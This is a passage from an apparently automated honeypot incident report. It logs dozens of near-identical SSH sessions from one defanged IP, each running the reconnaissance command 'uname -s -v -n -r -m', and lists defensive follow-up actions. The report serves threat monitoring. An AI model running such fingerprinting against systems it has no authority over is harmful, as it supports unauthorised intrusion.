- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d73f501a378f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:40` | `cowrie.session.connect` |
| `2026-07-04 19:06:40` | `cowrie.client.version` |
| `2026-07-04 19:06:40` | `cowrie.client.kex` |
| `2026-07-04 19:06:40` | `cowrie.login.success` |
| `2026-07-04 19:06:41` | `cowrie.session.params` |
| `2026-07-04 19:06:41` | `cowrie.command.input` |
| `2026-07-04 19:06:41` | `cowrie.log.closed` |
| `2026-07-04 19:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08fcba4c1b5a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:45` | `cowrie.session.connect` |
| `2026-07-04 19:06:45` | `cowrie.client.version` |
| `2026-07-04 19:06:45` | `cowrie.client.kex` |
| `2026-07-04 19:06:46` | `cowrie.login.success` |
| `2026-07-04 19:06:47` | `cowrie.session.params` |
| `2026-07-04 19:06:47` | `cowrie.command.input` |
| `2026-07-04 19:06:47` | `cowrie.log.closed` |
| `2026-07-04 19:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df788e8adf29

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:51` | `cowrie.session.connect` |
| `2026-07-04 19:06:51` | `cowrie.client.version` |
| `2026-07-04 19:06:51` | `cowrie.client.kex` |
| `2026-07-04 19:06:52` | `cowrie.login.success` |
| `2026-07-04 19:06:52` | `cowrie.session.params` |
| `2026-07-04 19:06:52` | `cowrie.command.input` |
| `2026-07-04 19:06:53` | `cowrie.log.closed` |
| `2026-07-04 19:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5b1cbd25a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:56` | `cowrie.session.connect` |
| `2026-07-04 19:06:56` | `cowrie.client.version` |
| `2026-07-04 19:06:56` | `cowrie.client.kex` |
| `2026-07-04 19:06:57` | `cowrie.login.success` |
| `2026-07-04 19:06:58` | `cowrie.session.params` |
| `2026-07-04 19:06:58` | `cowrie.command.input` |
| `2026-07-04 19:06:58` | `cowrie.log.closed` |
| `2026-07-04 19:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96b89e2af3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:02` | `cowrie.session.connect` |
| `2026-07-04 19:07:02` | `cowrie.client.version` |
| `2026-07-04 19:07:02` | `cowrie.client.kex` |
| `2026-07-04 19:07:02` | `cowrie.login.success` |
| `2026-07-04 19:07:03` | `cowrie.session.params` |
| `2026-07-04 19:07:03` | `cowrie.command.input` |
| `2026-07-04 19:07:03` | `cowrie.log.closed` |
| `2026-07-04 19:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aaae25fe17f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:07` | `cowrie.session.connect` |
| `2026-07-04 19:07:07` | `cowrie.client.version` |
| `2026-07-04 19:07:07` | `cowrie.client.kex` |
| `2026-07-04 19:07:08` | `cowrie.login.success` |
| `2026-07-04 19:07:09` | `cowrie.session.params` |
| `2026-07-04 19:07:09` | `cowrie.command.input` |
| `2026-07-04 19:07:09` | `cowrie.log.closed` |
| `2026-07-04 19:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318b6c84da51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:12` | `cowrie.session.connect` |
| `2026-07-04 19:07:12` | `cowrie.client.version` |
| `2026-07-04 19:07:13` | `cowrie.client.kex` |
| `2026-07-04 19:07:13` | `cowrie.login.success` |
| `2026-07-04 19:07:14` | `cowrie.session.params` |
| `2026-07-04 19:07:14` | `cowrie.command.input` |
| `2026-07-04 19:07:15` | `cowrie.log.closed` |
| `2026-07-04 19:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b89540ad09

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:18` | `cowrie.session.connect` |
| `2026-07-04 19:07:18` | `cowrie.client.version` |
| `2026-07-04 19:07:18` | `cowrie.client.kex` |
| `2026-07-04 19:07:18` | `cowrie.login.success` |
| `2026-07-04 19:07:19` | `cowrie.session.params` |
| `2026-07-04 19:07:19` | `cowrie.command.input` |
| `2026-07-04 19:07:19` | `cowrie.log.closed` |
| `2026-07-04 19:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfaf799c9727

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:23` | `cowrie.session.connect` |
| `2026-07-04 19:07:23` | `cowrie.client.version` |
| `2026-07-04 19:07:23` | `cowrie.client.kex` |
| `2026-07-04 19:07:24` | `cowrie.login.success` |
| `2026-07-04 19:07:25` | `cowrie.session.params` |
| `2026-07-04 19:07:25` | `cowrie.command.input` |
| `2026-07-04 19:07:25` | `cowrie.log.closed` |
| `2026-07-04 19:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73ea9f6d16a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:28` | `cowrie.session.connect` |
| `2026-07-04 19:07:28` | `cowrie.client.version` |
| `2026-07-04 19:07:28` | `cowrie.client.kex` |
| `2026-07-04 19:07:29` | `cowrie.login.success` |
| `2026-07-04 19:07:30` | `cowrie.session.params` |
| `2026-07-04 19:07:30` | `cowrie.command.input` |
| `2026-07-04 19:07:30` | `cowrie.log.closed` |
| `2026-07-04 19:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3cb49154f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:34` | `cowrie.session.connect` |
| `2026-07-04 19:07:34` | `cowrie.client.version` |
| `2026-07-04 19:07:34` | `cowrie.client.kex` |
| `2026-07-04 19:07:34` | `cowrie.login.success` |
| `2026-07-04 19:07:35` | `cowrie.session.params` |
| `2026-07-04 19:07:35` | `cowrie.command.input` |
| `2026-07-04 19:07:35` | `cowrie.log.closed` |
| `2026-07-04 19:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286c80f72544

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:39` | `cowrie.session.connect` |
| `2026-07-04 19:07:39` | `cowrie.client.version` |
| `2026-07-04 19:07:39` | `cowrie.client.kex` |
| `2026-07-04 19:07:40` | `cowrie.login.success` |
| `2026-07-04 19:07:40` | `cowrie.session.params` |
| `2026-07-04 19:07:40` | `cowrie.command.input` |
| `2026-07-04 19:07:41` | `cowrie.log.closed` |
| `2026-07-04 19:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc7fdd3e1db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:44` | `cowrie.session.connect` |
| `2026-07-04 19:07:44` | `cowrie.client.version` |
| `2026-07-04 19:07:45` | `cowrie.client.kex` |
| `2026-07-04 19:07:45` | `cowrie.login.success` |
| `2026-07-04 19:07:46` | `cowrie.session.params` |
| `2026-07-04 19:07:46` | `cowrie.command.input` |
| `2026-07-04 19:07:46` | `cowrie.log.closed` |
| `2026-07-04 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5610982240e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:50` | `cowrie.session.connect` |
| `2026-07-04 19:07:50` | `cowrie.client.version` |
| `2026-07-04 19:07:50` | `cowrie.client.kex` |
| `2026-07-04 19:07:51` | `cowrie.login.success` |
| `2026-07-04 19:07:51` | `cowrie.session.params` |
| `2026-07-04 19:07:51` | `cowrie.command.input` |
| `2026-07-04 19:07:52` | `cowrie.log.closed` |
| `2026-07-04 19:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4640f47598

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:07 |
| **Last Seen** | 2026-07-04 19:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:07:55` | `cowrie.session.connect` |
| `2026-07-04 19:07:55` | `cowrie.client.version` |
| `2026-07-04 19:07:55` | `cowrie.client.kex` |
| `2026-07-04 19:07:56` | `cowrie.login.success` |
| `2026-07-04 19:07:57` | `cowrie.session.params` |
| `2026-07-04 19:07:57` | `cowrie.command.input` |
| `2026-07-04 19:07:57` | `cowrie.log.closed` |
| `2026-07-04 19:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a30ea9e7ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:00` | `cowrie.session.connect` |
| `2026-07-04 19:08:00` | `cowrie.client.version` |
| `2026-07-04 19:08:01` | `cowrie.client.kex` |
| `2026-07-04 19:08:01` | `cowrie.login.success` |
| `2026-07-04 19:08:02` | `cowrie.session.params` |
| `2026-07-04 19:08:02` | `cowrie.command.input` |
| `2026-07-04 19:08:02` | `cowrie.log.closed` |
| `2026-07-04 19:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0bdebf85b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:06` | `cowrie.session.connect` |
| `2026-07-04 19:08:06` | `cowrie.client.version` |
| `2026-07-04 19:08:06` | `cowrie.client.kex` |
| `2026-07-04 19:08:06` | `cowrie.login.success` |
| `2026-07-04 19:08:07` | `cowrie.session.params` |
| `2026-07-04 19:08:07` | `cowrie.command.input` |
| `2026-07-04 19:08:07` | `cowrie.log.closed` |
| `2026-07-04 19:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5c29458279

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:11` | `cowrie.session.connect` |
| `2026-07-04 19:08:11` | `cowrie.client.version` |
| `2026-07-04 19:08:11` | `cowrie.client.kex` |
| `2026-07-04 19:08:12` | `cowrie.login.success` |
| `2026-07-04 19:08:13` | `cowrie.session.params` |
| `2026-07-04 19:08:13` | `cowrie.command.input` |
| `2026-07-04 19:08:13` | `cowrie.log.closed` |
| `2026-07-04 19:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd6117481c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:17` | `cowrie.session.connect` |
| `2026-07-04 19:08:17` | `cowrie.client.version` |
| `2026-07-04 19:08:17` | `cowrie.client.kex` |
| `2026-07-04 19:08:17` | `cowrie.login.success` |
| `2026-07-04 19:08:18` | `cowrie.session.params` |
| `2026-07-04 19:08:18` | `cowrie.command.input` |
| `2026-07-04 19:08:18` | `cowrie.log.closed` |
| `2026-07-04 19:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7ddef49493

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:22` | `cowrie.session.connect` |
| `2026-07-04 19:08:22` | `cowrie.client.version` |
| `2026-07-04 19:08:22` | `cowrie.client.kex` |
| `2026-07-04 19:08:22` | `cowrie.login.success` |
| `2026-07-04 19:08:23` | `cowrie.session.params` |
| `2026-07-04 19:08:23` | `cowrie.command.input` |
| `2026-07-04 19:08:24` | `cowrie.log.closed` |
| `2026-07-04 19:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e163b8dfac3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:27` | `cowrie.session.connect` |
| `2026-07-04 19:08:27` | `cowrie.client.version` |
| `2026-07-04 19:08:27` | `cowrie.client.kex` |
| `2026-07-04 19:08:28` | `cowrie.login.success` |
| `2026-07-04 19:08:29` | `cowrie.session.params` |
| `2026-07-04 19:08:29` | `cowrie.command.input` |
| `2026-07-04 19:08:29` | `cowrie.log.closed` |
| `2026-07-04 19:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56cfef0ac56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:33` | `cowrie.session.connect` |
| `2026-07-04 19:08:33` | `cowrie.client.version` |
| `2026-07-04 19:08:33` | `cowrie.client.kex` |
| `2026-07-04 19:08:33` | `cowrie.login.success` |
| `2026-07-04 19:08:34` | `cowrie.session.params` |
| `2026-07-04 19:08:34` | `cowrie.command.input` |
| `2026-07-04 19:08:34` | `cowrie.log.closed` |
| `2026-07-04 19:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81085e9d61ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:38` | `cowrie.session.connect` |
| `2026-07-04 19:08:38` | `cowrie.client.version` |
| `2026-07-04 19:08:38` | `cowrie.client.kex` |
| `2026-07-04 19:08:39` | `cowrie.login.success` |
| `2026-07-04 19:08:40` | `cowrie.session.params` |
| `2026-07-04 19:08:40` | `cowrie.command.input` |
| `2026-07-04 19:08:40` | `cowrie.log.closed` |
| `2026-07-04 19:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910894b9e025

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:43` | `cowrie.session.connect` |
| `2026-07-04 19:08:43` | `cowrie.client.version` |
| `2026-07-04 19:08:44` | `cowrie.client.kex` |
| `2026-07-04 19:08:44` | `cowrie.login.success` |
| `2026-07-04 19:08:45` | `cowrie.session.params` |
| `2026-07-04 19:08:45` | `cowrie.command.input` |
| `2026-07-04 19:08:45` | `cowrie.log.closed` |
| `2026-07-04 19:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22487f8bd834

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:49` | `cowrie.session.connect` |
| `2026-07-04 19:08:49` | `cowrie.client.version` |
| `2026-07-04 19:08:49` | `cowrie.client.kex` |
| `2026-07-04 19:08:49` | `cowrie.login.success` |
| `2026-07-04 19:08:50` | `cowrie.session.params` |
| `2026-07-04 19:08:50` | `cowrie.command.input` |
| `2026-07-04 19:08:50` | `cowrie.log.closed` |
| `2026-07-04 19:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932f5669d2b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:08 |
| **Last Seen** | 2026-07-04 19:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:08:54` | `cowrie.session.connect` |
| `2026-07-04 19:08:54` | `cowrie.client.version` |
| `2026-07-04 19:08:54` | `cowrie.client.kex` |
| `2026-07-04 19:08:55` | `cowrie.login.success` |
